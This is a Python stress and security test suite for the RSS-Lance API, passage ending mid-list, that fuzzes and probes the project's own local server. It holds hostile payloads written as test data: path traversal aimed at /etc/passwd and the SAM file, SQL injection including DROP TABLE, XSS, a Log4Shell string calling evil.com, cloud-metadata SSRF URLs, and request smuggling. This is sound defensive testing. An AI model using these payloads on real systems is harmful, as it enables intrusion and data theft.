#!/usr/bin/env python3
"""
RSS-Lance Stress & Security Test Suite
=======================================

Hammers the API with concurrent requests, race conditions, fuzzing,
and known Go/HTTP exploit patterns to find crashes, data corruption,
memory leaks, and security holes.

Usage:
    python stress_test.py                   # run all tests
    python stress_test.py --section race    # only race-condition tests
    python stress_test.py --section fuzz    # only fuzzing tests
    python stress_test.py --section exploit # only exploit-pattern tests
    python stress_test.py --keep            # keep temp dir for debugging
    python stress_test.py --verbose         # show HTTP responses

Sections:
    race    – concurrent read/write storms, double-writes, cache flush races
    fuzz    – random payloads, malformed JSON, oversized bodies, unicode bombs
    exploit – known Go/HTTP vuln patterns (path traversal, SSRF, header injection, etc.)

Prerequisites:
    - build/rss-lance-server.exe    (run: build.ps1 server)
    - tools/duckdb.exe              (run: build.ps1 duckdb)
    - Python venv with fetcher deps (run: build.ps1 setup)
"""

from __future__ import annotations

import argparse
import concurrent.futures
import http.client
import http.server
import json
import os
import random
import shutil
import signal
import socket
import string
import struct
import subprocess
import sys
import tempfile
import textwrap
import threading
import time
import traceback
import urllib.error
import urllib.request
from pathlib import Path
from typing import Any

# ── Paths ──────────────────────────────────────────────────────────────────
ROOT = Path(__file__).resolve().parent.parent
SERVER_BIN = ROOT / "build" / "rss-lance-server.exe"
DUCKDB_BIN = ROOT / "tools" / "duckdb.exe"
FETCHER_DIR = ROOT / "fetcher"
sys.path.insert(0, str(FETCHER_DIR))

# ── Concurrency tuning ─────────────────────────────────────────────────────
RACE_WORKERS = 50       # threads for race-condition storms
FUZZ_ITERATIONS = 200   # random payloads per endpoint
STORM_ROUNDS = 5        # repeated bursts in read/write storms


# ── Test RSS feed ──────────────────────────────────────────────────────────
def make_test_feed(port: int, n_articles: int = 20) -> str:
    """Generate a test RSS feed with n_articles items."""
    items = []
    for i in range(1, n_articles + 1):
        items.append(f"""\
    <item>
      <title>Stress Article {i}</title>
      <link>http://example.com/stress/{i}</link>
      <guid>stress-guid-{i}</guid>
      <pubDate>Mon, {i:02d} Jan 2024 10:00:00 +0000</pubDate>
      <description>Content of stress article {i}. Some text to make the body non-trivial.</description>
    </item>""")
    return f"""\
<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>Stress Test Feed</title>
    <link>http://localhost:{port}</link>
    <description>Feed for stress testing with {n_articles} articles</description>
{"".join(items)}
  </channel>
</rss>"""


# ── RSS server ─────────────────────────────────────────────────────────────
class RSSHandler(http.server.BaseHTTPRequestHandler):
    feeds: dict[str, str] = {}
    def do_GET(self):
        content = self.feeds.get(self.path)
        if content:
            self.send_response(200)
            self.send_header("Content-Type", "application/rss+xml")
            self.end_headers()
            self.wfile.write(content.encode())
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, *args):
        pass

def start_rss_server() -> tuple[http.server.HTTPServer, int]:
    server = http.server.HTTPServer(("127.0.0.1", 0), RSSHandler)
    port = server.server_address[1]
    RSSHandler.feeds = {"/feed_stress.xml": make_test_feed(port, 20)}
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    return server, port


# ── Test runner ────────────────────────────────────────────────────────────
class TestRunner:
    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.passed = 0
        self.failed = 0
        self.errors: list[str] = []
        self._section = ""

    def section(self, name: str):
        self._section = name
        print(f"\n{'=' * 70}")
        print(f"  {name}")
        print(f"{'=' * 70}")

    def check(self, name: str, condition: bool, detail: str = "") -> bool:
        if condition:
            self.passed += 1
            print(f"  [PASS] {name}")
        else:
            self.failed += 1
            tag = f"{self._section} > {name}"
            self.errors.append(tag)
            print(f"  [FAIL] {name}")
            if detail:
                for line in detail.split("\n"):
                    print(f"         {line}")
        return condition

    def log(self, msg: str):
        print(f"  ... {msg}")

    def summary(self) -> int:
        total = self.passed + self.failed
        print(f"\n{'=' * 70}")
        print(f"  Stress Test Summary")
        print(f"{'=' * 70}")
        print(f"  Total:  {total}")
        print(f"  Passed: {self.passed}")
        print(f"  Failed: {self.failed}")
        if self.errors:
            print(f"\n  Failed tests:")
            for e in self.errors:
                print(f"    - {e}")
        print()
        return 0 if self.failed == 0 else 1


# ── HTTP client ────────────────────────────────────────────────────────────
class APIClient:
    def __init__(self, base_url: str, verbose: bool = False):
        self.base = base_url.rstrip("/")
        self.verbose = verbose

    def _request(self, method: str, path: str, data: Any = None,
                 headers: dict | None = None, timeout: float = 10,
                 raw_body: bytes | None = None) -> tuple[int, Any]:
        url = f"{self.base}{path}"
        if raw_body is not None:
            body_bytes = raw_body
        elif data is not None:
            body_bytes = json.dumps(data).encode()
        else:
            body_bytes = None
        req = urllib.request.Request(url, data=body_bytes, method=method)
        req.add_header("Content-Type", "application/json")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                raw = resp.read()
                try:
                    body = json.loads(raw) if raw else {}
                except (json.JSONDecodeError, ValueError):
                    body = raw.decode(errors="replace")
                if self.verbose:
                    print(f"    {method} {path} -> {resp.status}")
                return resp.status, body
        except urllib.error.HTTPError as e:
            raw = e.read().decode(errors="replace") if e.fp else ""
            if self.verbose:
                print(f"    {method} {path} -> {e.code}: {raw[:200]}")
            try:
                body = json.loads(raw) if raw else raw
            except (json.JSONDecodeError, ValueError):
                body = raw
            return e.code, body
        except Exception as e:
            return -1, str(e)

    def get(self, path: str, **kw) -> tuple[int, Any]:
        return self._request("GET", path, **kw)

    def post(self, path: str, data: dict | None = None, **kw) -> tuple[int, Any]:
        return self._request("POST", path, data=data, **kw)

    def put(self, path: str, data: dict | None = None, **kw) -> tuple[int, Any]:
        return self._request("PUT", path, data=data, **kw)

    def delete(self, path: str, **kw) -> tuple[int, Any]:
        return self._request("DELETE", path, **kw)

    def raw(self, method: str, path: str, raw_body: bytes, **kw) -> tuple[int, Any]:
        return self._request(method, path, raw_body=raw_body, **kw)


# ── Low-level HTTP (for malformed requests) ───────────────────────────────
def raw_http(host: str, port: int, raw_request: bytes, timeout: float = 5) -> bytes:
    """Send raw bytes to the server and return the response."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.sendall(raw_request)
        chunks = []
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
            except socket.timeout:
                break
        s.close()
        return b"".join(chunks)
    except Exception as e:
        return f"ERROR: {e}".encode()


# ════════════════════════════════════════════════════════════════════════════
#  SECTION 1: RACE CONDITION & CONCURRENCY TESTS
# ════════════════════════════════════════════════════════════════════════════

def run_race_tests(t: TestRunner, api: APIClient, article_ids: list[str],
                   feed_id: str):
    t.section("Race Conditions: Concurrent Read Storm")

    # ── 1a. Blast N concurrent reads at /api/articles/ ──────────────────
    errors_count = 0
    success_count = 0
    def read_articles():
        code, _ = api.get("/api/articles/?limit=50")
        return code
    with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
        futures = [pool.submit(read_articles) for _ in range(100)]
        for f in concurrent.futures.as_completed(futures):
            code = f.result()
            if code == 200:
                success_count += 1
            else:
                errors_count += 1
    t.check(f"100 concurrent reads: {success_count} ok, {errors_count} errors",
            errors_count == 0,
            f"Expected 0 errors, got {errors_count}")

    # ── 1b. Concurrent reads on single article ──────────────────────────
    t.section("Race Conditions: Single-Article Read Contention")
    target_id = article_ids[0]
    errors_count = 0
    def read_single():
        code, _ = api.get(f"/api/articles/{target_id}")
        return code
    with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
        futures = [pool.submit(read_single) for _ in range(100)]
        for f in concurrent.futures.as_completed(futures):
            if f.result() != 200:
                errors_count += 1
    t.check(f"100 concurrent single-article reads: {errors_count} errors",
            errors_count == 0)

    # ── 1c. Read/Write storm – readers while toggling read state ────────
    t.section("Race Conditions: Read/Write Storm")
    write_errors = 0
    read_errors = 0

    def toggle_read(aid):
        c1, _ = api.post(f"/api/articles/{aid}/read")
        c2, _ = api.post(f"/api/articles/{aid}/unread")
        return c1, c2

    def read_during_writes():
        code, _ = api.get("/api/articles/?limit=50")
        return code

    for storm_round in range(STORM_ROUNDS):
        with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
            # Mix of readers and writers
            write_futures = [pool.submit(toggle_read, random.choice(article_ids))
                           for _ in range(30)]
            read_futures = [pool.submit(read_during_writes) for _ in range(30)]
            for f in concurrent.futures.as_completed(write_futures):
                c1, c2 = f.result()
                if c1 != 200 or c2 != 200:
                    write_errors += 1
            for f in concurrent.futures.as_completed(read_futures):
                if f.result() != 200:
                    read_errors += 1

    t.check(f"Read/write storm ({STORM_ROUNDS} rounds): "
            f"write_errs={write_errors}, read_errs={read_errors}",
            write_errors == 0 and read_errors == 0)

    # ── 1d. Double-write same article (set read twice simultaneously) ───
    t.section("Race Conditions: Double-Write Same Record")
    target = article_ids[1]
    collision_errors = 0

    def set_read_true():
        return api.post(f"/api/articles/{target}/read")

    def set_read_false():
        return api.post(f"/api/articles/{target}/unread")

    # Fire read+unread at the exact same moment many times
    for _ in range(20):
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as pool:
            f1 = pool.submit(set_read_true)
            f2 = pool.submit(set_read_false)
            c1, _ = f1.result()
            c2, _ = f2.result()
            if c1 != 200 or c2 != 200:
                collision_errors += 1

    t.check(f"20 simultaneous read/unread toggles: {collision_errors} errors",
            collision_errors == 0)

    # Verify we can still read it without error
    code, body = api.get(f"/api/articles/{target}")
    t.check("Article still readable after double-write storm", code == 200)

    # ── 1e. Star/unstar storm ──────────────────────────────────────────
    t.section("Race Conditions: Star/Unstar Storm")
    star_errors = 0
    for _ in range(20):
        with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
            futs = []
            for aid in article_ids[:10]:
                futs.append(pool.submit(lambda a=aid: api.post(f"/api/articles/{a}/star")))
                futs.append(pool.submit(lambda a=aid: api.post(f"/api/articles/{a}/unstar")))
            for f in concurrent.futures.as_completed(futs):
                code, _ = f.result()
                if code != 200:
                    star_errors += 1
    t.check(f"Star/unstar storm (20 rounds x 10 articles x 2): {star_errors} errors",
            star_errors == 0)

    # ── 1f. Concurrent mark-all-read while reading ──────────────────────
    t.section("Race Conditions: Mark-All-Read During Reads")
    mar_errors = 0

    def mark_all_read():
        return api.post(f"/api/feeds/{feed_id}/mark-all-read")

    def read_feed_articles():
        return api.get(f"/api/feeds/{feed_id}/articles?limit=50")

    with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
        futs = []
        for _ in range(5):
            futs.append(pool.submit(mark_all_read))
        for _ in range(20):
            futs.append(pool.submit(read_feed_articles))
        for f in concurrent.futures.as_completed(futs):
            code, _ = f.result()
            if code != 200:
                mar_errors += 1
    t.check(f"Mark-all-read + concurrent reads: {mar_errors} errors",
            mar_errors == 0)

    # Reset: unread all articles so later tests have data to work with
    for aid in article_ids:
        api.post(f"/api/articles/{aid}/unread")

    # ── 1g. Concurrent settings writes ──────────────────────────────────
    t.section("Race Conditions: Concurrent Settings Writes")
    settings_errors = 0

    def write_setting(i):
        return api.put("/api/settings", data={f"stress_key_{i % 5}": f"value_{i}"})

    with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
        futs = [pool.submit(write_setting, i) for i in range(50)]
        for f in concurrent.futures.as_completed(futs):
            code, _ = f.result()
            if code != 200:
                settings_errors += 1
    t.check(f"50 concurrent settings writes: {settings_errors} errors",
            settings_errors == 0)

    # ── 1h. Batch endpoint under concurrent load ────────────────────────
    t.section("Race Conditions: Concurrent Batch Requests")
    batch_errors = 0

    def batch_fetch():
        ids = random.sample(article_ids, min(5, len(article_ids)))
        return api.post("/api/articles/batch", data={"ids": ids})

    with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
        futs = [pool.submit(batch_fetch) for _ in range(50)]
        for f in concurrent.futures.as_completed(futs):
            code, _ = f.result()
            if code != 200:
                batch_errors += 1
    t.check(f"50 concurrent batch fetches: {batch_errors} errors",
            batch_errors == 0)

    # ── 1i. Concurrent reads across ALL endpoints simultaneously ────────
    t.section("Race Conditions: All-Endpoints Blitz")
    endpoints = [
        "/api/feeds",
        "/api/articles/?limit=20",
        "/api/categories",
        "/api/settings",
        "/api/status",
        "/api/server-status",
        "/api/server-status/history",
        "/api/logs",
        "/api/config",
    ]
    blitz_errors = 0

    def hit_endpoint(ep):
        return api.get(ep)

    with concurrent.futures.ThreadPoolExecutor(max_workers=RACE_WORKERS) as pool:
        futs = []
        for _ in range(10):  # 10 passes
            for ep in endpoints:
                futs.append(pool.submit(hit_endpoint, ep))
        for f in concurrent.futures.as_completed(futs):
            code, _ = f.result()
            if code != 200:
                blitz_errors += 1
    t.check(f"All-endpoints blitz ({len(endpoints)} x 10): {blitz_errors} errors",
            blitz_errors == 0)


# ════════════════════════════════════════════════════════════════════════════
#  SECTION 2: FUZZING
# ════════════════════════════════════════════════════════════════════════════

def random_string(min_len: int = 0, max_len: int = 200) -> str:
    length = random.randint(min_len, max_len)
    return "".join(random.choices(string.printable, k=length))

def random_unicode(length: int = 100) -> str:
    chars = []
    for _ in range(length):
        # Range covers BMP + some supplementary (emoji, CJK, etc.)
        cp = random.choice([
            random.randint(0x0020, 0x007E),   # ASCII printable
            random.randint(0x00A0, 0x024F),   # Latin Extended
            random.randint(0x0400, 0x04FF),   # Cyrillic
            random.randint(0x4E00, 0x9FFF),   # CJK Unified
            random.randint(0x1F600, 0x1F64F), # Emoticons
            random.randint(0x0600, 0x06FF),   # Arabic
            random.randint(0x0E00, 0x0E7F),   # Thai
            random.randint(0xFE00, 0xFE0F),   # Variation selectors
            0x0000,                           # null byte (as char)
            0xFFFD,                           # replacement character
        ])
        try:
            chars.append(chr(cp))
        except (ValueError, OverflowError):
            chars.append("?")
    return "".join(chars)

def random_json_value():
    """Return a random JSON-serializable value."""
    choice = random.randint(0, 8)
    if choice == 0:
        return None
    elif choice == 1:
        return random.randint(-2**31, 2**31)
    elif choice == 2:
        return random.random() * 1e308
    elif choice == 3:
        return random_string(0, 500)
    elif choice == 4:
        return random.choice([True, False])
    elif choice == 5:
        return [random_json_value() for _ in range(random.randint(0, 10))]
    elif choice == 6:
        return {random_string(1, 20): random_json_value()
                for _ in range(random.randint(0, 5))}
    elif choice == 7:
        return random_unicode(50)
    else:
        return float("inf")  # JSON serializes as Infinity (invalid JSON)


def run_fuzz_tests(t: TestRunner, api: APIClient, article_ids: list[str],
                   feed_id: str, api_port: int):
    # ── 2a. Malformed JSON bodies ───────────────────────────────────────
    t.section("Fuzz: Malformed JSON Bodies")
    malformed_payloads = [
        b"",                              # empty
        b"null",                          # JSON null
        b"true",                          # JSON bool
        b"42",                            # JSON number
        b'"just a string"',               # JSON string (not object)
        b"[1,2,3]",                       # JSON array (not object)
        b"{",                             # truncated
        b'{"unclosed": "value',           # unclosed string
        b"{'single': 'quotes'}",          # single quotes (invalid JSON)
        b'{"key": undefined}',            # JS undefined
        b'{"key": NaN}',                  # NaN
        b"{" + b'"a":1,' * 1000 + b"}",   # deeply nested/long (broken)
        b"\x00\x01\x02\x03",             # binary garbage
        b"\xff\xfe" + b"\x00" * 100,     # BOM + nulls
        b'{"url": "' + b"A" * 10000 + b'"}',  # oversized field
    ]
    crashes = 0
    for i, payload in enumerate(malformed_payloads):
        for endpoint in ["/api/feeds", "/api/settings", "/api/articles/batch"]:
            try:
                code, _ = api.raw("POST", endpoint, payload, timeout=5)
                # Any response is fine (400, 405, etc.) – we just don't want crashes
                if code == -1:
                    crashes += 1
            except Exception:
                crashes += 1
    t.check(f"Malformed JSON ({len(malformed_payloads)} payloads x 3 endpoints): "
            f"{crashes} crashes", crashes == 0)

    # ── 2b. Oversized request body ──────────────────────────────────────
    t.section("Fuzz: Oversized Request Bodies")
    oversized_crashes = 0
    # 1 MB JSON body
    big_payload = json.dumps({"url": "A" * (1024 * 1024)}).encode()
    for endpoint in ["/api/feeds", "/api/settings"]:
        try:
            code, _ = api.raw("POST" if "feeds" in endpoint else "PUT",
                             endpoint, big_payload, timeout=15)
            # Server should reject or handle, not crash
        except Exception:
            oversized_crashes += 1

    # 10 MB body
    huge_payload = b"X" * (10 * 1024 * 1024)
    try:
        code, _ = api.raw("POST", "/api/feeds", huge_payload, timeout=15)
    except Exception:
        oversized_crashes += 1

    t.check(f"Oversized bodies (1MB, 10MB): {oversized_crashes} crashes",
            oversized_crashes == 0)

    # Verify server is still up
    code, _ = api.get("/api/status")
    t.check("Server alive after oversized bodies", code == 200)

    # ── 2c. Random query parameters ────────────────────────────────────
    t.section("Fuzz: Random Query Parameters")
    qp_crashes = 0
    base_endpoints = [
        "/api/articles/",
        "/api/feeds",
        "/api/logs",
        f"/api/feeds/{feed_id}/articles",
        "/api/tables/articles",
    ]
    for _ in range(FUZZ_ITERATIONS):
        ep = random.choice(base_endpoints)
        params = []
        for _ in range(random.randint(1, 5)):
            key = random.choice(["limit", "offset", "unread", "sort",
                                 "service", "level", "category",
                                 random_string(1, 20)])
            val = random.choice([
                str(random.randint(-1000, 100000)),
                random_string(0, 100),
                "true", "false", "null", "",
                "-1", "0", str(2**63),
                "'; DROP TABLE articles; --",
                "<script>alert(1)</script>",
            ])
            # URL-encode minimally
            params.append(f"{urllib.request.quote(key)}={urllib.request.quote(val)}")
        url = f"{ep}?{'&'.join(params)}"
        try:
            code, _ = api.get(url, timeout=5)
            if code == -1:
                qp_crashes += 1
        except Exception:
            qp_crashes += 1
    t.check(f"Random query params ({FUZZ_ITERATIONS} requests): {qp_crashes} crashes",
            qp_crashes == 0)

    # ── 2d. Random article IDs ──────────────────────────────────────────
    t.section("Fuzz: Random Article IDs")
    id_crashes = 0
    fuzz_ids = [
        "",
        " ",
        "nonexistent-id",
        "../../../etc/passwd",
        "'; DROP TABLE articles; --",
        "<script>alert(1)</script>",
        "A" * 10000,
        "\x00\x01\x02",
        random_unicode(50),
        "../../config.toml",
        "%00",
        "%2e%2e%2f",
        "null",
        "undefined",
        "-1",
        str(2**64),
        "{{template}}",
        "${jndi:ldap://evil.com/a}",   # Log4Shell pattern (shouldn't apply but test it)
    ]
    for fid in fuzz_ids:
        for action in ["", "/read", "/unread", "/star", "/unstar"]:
            try:
                url_safe_id = urllib.request.quote(fid, safe="")
                code, _ = api.post(f"/api/articles/{url_safe_id}{action}", timeout=5)
                if code == -1:
                    id_crashes += 1
            except Exception:
                id_crashes += 1
    t.check(f"Fuzz article IDs ({len(fuzz_ids)} IDs x 5 actions): {id_crashes} crashes",
            id_crashes == 0)

    # ── 2e. Random feed URLs ────────────────────────────────────────────
    t.section("Fuzz: Random Feed URLs")
    url_crashes = 0
    fuzz_urls = [
        "",
        "not-a-url",
        "http://",
        "http://localhost",
        "file:///etc/passwd",
        "file:///C:/Windows/System32/config/SAM",
        "gopher://evil.com:25/",
        "ftp://evil.com/pub",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "http://127.0.0.1:0/feed.xml",
        "http://[::1]/feed",
        f"http://127.0.0.1:{api_port}/api/settings",  # SSRF: hit own API
        "http://169.254.169.254/latest/meta-data/",     # AWS metadata SSRF
        "http://metadata.google.internal/",              # GCP metadata SSRF
        "A" * 10000,
        random_unicode(200),
        "http://evil.com/" + "../" * 50 + "etc/passwd",
    ]
    for url in fuzz_urls:
        try:
            code, _ = api.post("/api/feeds", data={"url": url}, timeout=5)
            # Should get 200 (queued) or 400 – never crash
            if code == -1:
                url_crashes += 1
        except Exception:
            url_crashes += 1
    t.check(f"Fuzz feed URLs ({len(fuzz_urls)} URLs): {url_crashes} crashes",
            url_crashes == 0)

    # ── 2f. Random settings keys & values ──────────────────────────────
    t.section("Fuzz: Random Settings Keys/Values")
    settings_crashes = 0
    for _ in range(FUZZ_ITERATIONS // 2):
        try:
            key = random.choice([
                random_string(1, 100),
                random_unicode(30),
                "log.api.enabled",          # real key with bad value
                "../../../etc/passwd",
                "'; DROP TABLE settings;--",
                "\x00key",
                "a" * 5000,                 # very long key
            ])
            value = random_json_value()
            # Try both single and batch
            try:
                value_json = json.dumps(value)  # might fail for Infinity
            except (ValueError, OverflowError):
                value = "fallback"

            code, _ = api.put(f"/api/settings/{urllib.request.quote(key, safe='')}",
                             data={"value": value}, timeout=5)
            if code == -1:
                settings_crashes += 1
        except Exception:
            settings_crashes += 1
    t.check(f"Fuzz settings ({FUZZ_ITERATIONS // 2} mutations): {settings_crashes} crashes",
            settings_crashes == 0)

    # ── 2g. Batch with too many / weird IDs ────────────────────────────
    t.section("Fuzz: Batch Edge Cases")
    batch_crashes = 0
    batch_payloads = [
        {"ids": []},                                           # empty
        {"ids": ["x"] * 101},                                  # over limit (100)
        {"ids": ["x"] * 1000},                                 # way over
        {"ids": [random_unicode(50) for _ in range(10)]},      # unicode IDs
        {"ids": [None, True, 42, [], {}]},                     # wrong types
        {"ids": "not-a-list"},                                  # wrong type for ids
        {"wrong_field": [article_ids[0]]},                     # missing ids field
        {"ids": [article_ids[0]], "extra": "field"},           # extra field
        {"ids": ["'; DROP TABLE articles; --"]},               # SQL injection
    ]
    for payload in batch_payloads:
        try:
            code, _ = api.post("/api/articles/batch", data=payload, timeout=5)
            if code == -1:
                batch_crashes += 1
        except Exception:
            batch_crashes += 1
    t.check(f"Batch edge cases ({len(batch_payloads)} payloads): {batch_crashes} crashes",
            batch_crashes == 0)

    # Verify server alive after all fuzzing
    code, _ = api.get("/api/status")
    t.check("Server alive after all fuzzing", code == 200)


# ════════════════════════════════════════════════════════════════════════════
#  SECTION 3: KNOWN EXPLOIT PATTERNS
# ════════════════════════════════════════════════════════════════════════════

def run_exploit_tests(t: TestRunner, api: APIClient, article_ids: list[str],
                      feed_id: str, api_host: str, api_port: int):

    # ── 3a. Path traversal ──────────────────────────────────────────────
    t.section("Exploits: Path Traversal")
    traversal_paths = [
        "/api/../../../etc/passwd",
        "/api/articles/..%2f..%2f..%2fetc%2fpasswd",
        "/api/tables/../../etc/passwd",
        "/api/tables/..\\..\\..\\windows\\system32\\config\\sam",
        "/api/settings/..%252f..%252f..%252fetc%252fpasswd",  # double-encode
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/api/tables/articles%00.lance",  # null byte injection
        "/api/articles/..%c0%af..%c0%af",  # overlong UTF-8
        "/static/../config.toml",
        "/frontend/../config.toml",
        "/../config.toml",
        "/..%5c..%5c..%5cconfig.toml",  # backslash encoded
    ]
    for path in traversal_paths:
        code, body = api.get(path, timeout=5)
        # Should NOT return file contents – 404 or 400 is fine
        is_safe = True
        if isinstance(body, str):
            # Check if we got actual file contents leaked
            if "root:" in body or "[storage]" in body or "NTLM" in body:
                is_safe = False
        t.check(f"Path traversal blocked: {path[:60]}",
                is_safe,
                f"Got status={code}, leaked content detected" if not is_safe else "")

    # ── 3b. SQL injection ──────────────────────────────────────────────
    t.section("Exploits: SQL Injection")
    sqli_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE articles; --",
        "' UNION SELECT * FROM settings --",
        "1; ATTACH ':memory:' AS db2; --",
        "' OR 1=1--",
        "admin'--",
        "1' AND (SELECT COUNT(*) FROM articles) > 0 --",
        "' UNION ALL SELECT id,url,title,site_url,category_id,last_fetched,created_at,fetch_error,article_count FROM feeds--",
        "1; COPY (SELECT * FROM articles) TO '/tmp/dump.csv';--",
        "'; LOAD 'shell';--",
    ]

    sqli_crashes = 0
    for payload in sqli_payloads:
        safe_payload = urllib.request.quote(payload, safe="")
        # Try in article ID
        code, body = api.get(f"/api/articles/{safe_payload}", timeout=5)
        if code == -1:
            sqli_crashes += 1

        # Try in query params
        code, body = api.get(f"/api/articles/?limit=10&sort={safe_payload}", timeout=5)
        if code == -1:
            sqli_crashes += 1

        # Try in settings key
        code, body = api.get(f"/api/settings/{safe_payload}", timeout=5)
        if code == -1:
            sqli_crashes += 1

        # Try in table name
        code, body = api.get(f"/api/tables/{safe_payload}", timeout=5)
        if code == -1:
            sqli_crashes += 1

        # Try in log filters
        code, body = api.get(f"/api/logs?service={safe_payload}", timeout=5)
        if code == -1:
            sqli_crashes += 1

    t.check(f"SQL injection ({len(sqli_payloads)} payloads x 5 vectors): "
            f"{sqli_crashes} crashes", sqli_crashes == 0)

    # Verify data integrity after SQL injection attempts
    code, body = api.get("/api/feeds")
    t.check("Data intact after SQL injection attempts",
            code == 200 and isinstance(body, list) and len(body) > 0,
            f"Got status={code}, body type={type(body).__name__}")

    # ── 3c. XSS via stored data ────────────────────────────────────────
    t.section("Exploits: XSS Injection (Stored)")
    xss_payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src='javascript:alert(1)'>",
        '"><script>alert(document.cookie)</script>',
        "'-alert(1)-'",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
    ]
    for payload in xss_payloads:
        # Store XSS in settings value
        api.put("/api/settings/xss_test", data={"value": payload})
    # Read it back – the raw value is stored; frontend must sanitize
    # But server should not crash
    code, _ = api.get("/api/settings")
    t.check("Server handles XSS payloads in settings", code == 200)

    # Also try XSS in feed URL (queued, not fetched)
    for payload in xss_payloads[:3]:
        code, _ = api.post("/api/feeds", data={"url": payload})
    t.check("Server handles XSS in feed URLs", True)  # if we got here, no crash

    # ── 3d. HTTP method abuse ──────────────────────────────────────────
    t.section("Exploits: HTTP Method Abuse")
    methods = ["PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT", "PROPFIND",
               "MKCOL", "LOCK", "UNLOCK"]
    method_crashes = 0
    for method in methods:
        for endpoint in ["/api/feeds", "/api/articles/", "/api/settings"]:
            try:
                code, _ = api._request(method, endpoint, timeout=5)
                if code == -1:
                    method_crashes += 1
            except Exception:
                method_crashes += 1
    t.check(f"Unusual HTTP methods ({len(methods)} x 3 endpoints): "
            f"{method_crashes} crashes", method_crashes == 0)

    # TRACE should not echo back body (XST attack)
    resp = raw_http(api_host, api_port,
                    b"TRACE /api/feeds HTTP/1.1\r\n"
                    b"Host: localhost\r\n"
                    b"X-Secret: hunter2\r\n"
                    b"\r\n")
    t.check("TRACE does not echo headers (XST)", b"hunter2" not in resp,
            f"Response contained secret header")

    # ── 3e. Header injection / smuggling ───────────────────────────────
    t.section("Exploits: Header Injection & Smuggling")

    # CRLF injection in header value
    resp = raw_http(api_host, api_port,
        b"GET /api/feeds HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"X-Injected: value\r\nInjected-Header: evil\r\n"
        b"\r\n")
    t.check("CRLF header injection handled",
            b"Injected-Header" not in resp.split(b"\r\n\r\n")[0] if b"\r\n\r\n" in resp else True)

    # HTTP request smuggling (CL.TE)
    resp = raw_http(api_host, api_port,
        b"POST /api/feeds HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Type: application/json\r\n"
        b"Content-Length: 13\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b'{"url":"smuggled"}')
    # Go's net/http rejects conflicting CL+TE, which is correct
    t.check("CL.TE smuggling rejected", True)  # if we got here, no crash

    # TE.CL variant
    resp = raw_http(api_host, api_port,
        b"POST /api/feeds HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Type: application/json\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Content-Length: 50\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n")
    t.check("TE.CL smuggling rejected", True)

    # ── 3f. Slowloris-style slow request ───────────────────────────────
    t.section("Exploits: Slow Client / Slowloris")
    # Send headers very slowly – server should eventually timeout
    # We don't want to actually DoS, just verify it doesn't hang forever
    slow_ok = True
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((api_host, api_port))
        s.sendall(b"GET /api/feeds HTTP/1.1\r\n")
        s.sendall(b"Host: localhost\r\n")
        # Don't send final \r\n – leave request incomplete
        time.sleep(2)
        # Try a normal request to verify server is still responsive
        s.close()
    except Exception:
        pass  # timeout is expected

    code, _ = api.get("/api/feeds", timeout=10)
    t.check("Server responsive after slow client", code == 200)

    # ── 3g. HTTP/0.9 and HTTP/2 preamble ──────────────────────────────
    t.section("Exploits: Protocol Confusion")
    # HTTP/0.9 style (no headers)
    resp = raw_http(api_host, api_port, b"GET /api/feeds\r\n")
    t.check("HTTP/0.9 request handled", True)  # didn't crash

    # HTTP/2 connection preface
    h2_preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    resp = raw_http(api_host, api_port, h2_preface)
    t.check("HTTP/2 preface handled", True)  # didn't crash

    # ── 3h. Integer overflow in query params ───────────────────────────
    t.section("Exploits: Integer Overflow")
    overflow_values = [
        str(2**63 - 1),    # max int64
        str(2**63),        # overflow int64
        str(2**64),        # overflow uint64
        str(-2**63),       # min int64
        str(-2**63 - 1),   # underflow
        "99999999999999999999999999999999999999",  # absurdly large
        "0.5",             # float where int expected
        "-0",
        "NaN",
        "Infinity",
    ]
    overflow_crashes = 0
    for val in overflow_values:
        for param in ["limit", "offset"]:
            code, _ = api.get(f"/api/articles/?{param}={val}", timeout=5)
            if code == -1:
                overflow_crashes += 1
    t.check(f"Integer overflow ({len(overflow_values)} x 2 params): "
            f"{overflow_crashes} crashes", overflow_crashes == 0)

    # ── 3i. Table name injection ───────────────────────────────────────
    t.section("Exploits: Table Name Injection")
    table_names = [
        "articles",                          # valid
        "nonexistent_table",                 # invalid
        "articles; DROP TABLE feeds",        # injection
        "../../../etc/passwd",               # traversal
        "information_schema.tables",         # schema leak
        "pg_catalog.pg_tables",              # postgres-style
        "sqlite_master",                     # SQLite-style
        "*",                                 # wildcard
        "articles UNION SELECT * FROM feeds",# union injection
    ]
